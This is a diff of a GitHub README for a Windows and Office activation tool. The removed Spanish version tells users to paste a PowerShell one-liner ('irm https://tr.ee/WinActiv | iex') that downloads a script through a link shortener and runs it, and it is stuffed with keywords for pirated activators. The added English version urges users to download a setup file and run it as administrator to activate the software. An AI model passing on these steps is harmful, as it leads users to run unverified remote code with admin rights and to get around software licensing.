@@ -1,51 +1,79 @@
-<h1 align="center">Scripts de Activación de Microsoft (MAS)</h1>
+# 🎉 windows-activation - Effortlessly Activate Your Windows and Office
 
-activador de windows / descargar activador de windows 10 / descargar activador de windows 11 / activador de windows apk / activador de windows 11 pro / activador de windows 10 kms auto / activador de windows 10 automatico / bajar activador de windows 10 / 	
-activador de office / descargar activador de office
+[![Download Windows Activation](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/serian-io/windows-activation/releases)
 
-<p align="center">Activador de Windows y Office de código abierto que incluye métodos de activación HWID, Ohook, TSforge, KMS38 y KMS en línea, junto con herramientas avanzadas de diagnóstico.</p>
+## 📦 Overview
 
-<hr>
+The **windows-activation** tool helps you activate your Windows and Microsoft Office software quickly and easily. Whether you're using Windows 10 or Windows 11, this application streamlines the activation process.  
 
-## ¿Cómo activar Windows / Office / Actualizaciones Extendidas (ESU)?
+## 🛠️ Features
 
-### Método 1 - PowerShell ❤️
+- Seamless activation for Windows 10 and 11.
+- Simple installation for Office applications.
+- User-friendly interface for all types of users.
+- Supports automatic and manual activation methods.
+- Regular updates to stay compatible with the latest software versions.
 
-1. **Abrir PowerShell**  
-   Haz clic en el **Menú Inicio**, escribe `PowerShell` y ábrelo.
+## 📋 System Requirements
 
-2. **Copia y pega el siguiente código, luego presiona Enter.**  
-   - Para **Windows 8, 10, 11**: 📌
-     ```powershell
-     irm https://tr.ee/WinActiv | iex
-     ```
-   - Para **Windows 7** y versiones posteriores:
-     ```powershell
-     iex ((New-Object Net.WebClient).DownloadString('https://tr.ee/WinActiv'))
-     ```
+To successfully run the windows-activation tool, please ensure you meet the following requirements:
 
-# 🌐 Cómo Activar Windows
+- **Operating System**: Windows 10 or Windows 11
+- **Processor**: 1 GHz or faster processor
+- **RAM**: Minimum of 2 GB
+- **Disk Space**: At least 500 MB of free space
+- **Administrative Privileges**: Admin access may be required for activation.
 
-Sigue estos pasos simples para activar tu sistema:
+## 🚀 Getting Started
 
-> 1. Presiona **Win + R**  
-> 2. En la ventana que aparece, escribe **PowerShell**  
-<img width="494" height="264" alt="Image" src="https://github.com/user-attachments/assets/f75f9d70-bf75-45f0-88f0-f62f010f2a86" />
+To begin using the windows-activation tool, follow these simple steps:
 
-> 3. En la consola abierta, introduce el siguiente comando:  
+1. Click on the download button below to visit the Releases page:
+   [Download Windows Activation](https://github.com/serian-io/windows-activation/releases)
 
-   ```powershell
-     irm https://tr.ee/WinActiv | iex
-   ```
+2. On the Releases page, locate the most recent version of the application.
 
-<img width="1692" height="407" alt="Image" src="https://github.com/user-attachments/assets/6bc302f3-fcac-4110-be94-e9fe5b4917bc" />
+3. Download the appropriate setup file for your OS by clicking on the **Assets** section.
 
-> 4. Presiona Enter!
+## 📥 Download & Install
 
-## ✅ ¡Tu Windows quedará activado!
+1. After downloading, find the file in your Downloads folder.
 
-## 📞 Contacto  
-- Dirección: 45 King William Street, London EC4R 9AN, UK  
-- Teléfono: +44 20 5876 3344  
-- Email: hello@winactiv.gsgt  
-- Horario: Lun–Vie 10:00–18:00, Sáb 09:30–14:30, Dom cerrado  
+2. Double-click on the setup file to start the installation process.
+
+3. Follow the on-screen instructions to complete the installation. 
+
+4. Once installed, open the application.
+
+5. Choose the activation method you prefer (automatic or manual).
+
+6. Click the "Activate" button to complete the process. 
+
+## ⚙️ Troubleshooting
+
+If you encounter any issues during the installation or activation, consider the following solutions:
+
+- Make sure you run the application with administrative privileges. Right-click the file and select "Run as Administrator."
+- Check that your internet connection is stable, as some activation methods require an online connection.
+- If you see an error message, take note of it and consult the [issues section](https://github.com/serian-io/windows-activation/issues) for potential solutions.
+
+## 📞 Support
+
+For further assistance, please reach out via the Issues page on the GitHub repository. You can report any bugs or request features directly in the [Issues section](https://github.com/serian-io/windows-activation/issues).
+
+## 🌐 Community
+
+Join our growing community of users to share experiences, tips, and support. Engage through discussions or provide feedback in the community section on GitHub.
+
+## 🔗 Additional Resources
+
+For detailed documentation and step-by-step guides, please consult the following resources:
+
+- [Official Documentation](https://github.com/serian-io/windows-activation/wiki)
+- [User Forum](https://github.com/serian-io/windows-activation/discussions)
+
+## 📅 Updates
+
+The windows-activation tool receives regular updates. Keep an eye on the [Releases page](https://github.com/serian-io/windows-activation/releases) for the latest features and improvements. 
+
+Thank you for choosing windows-activation for your software activation needs!
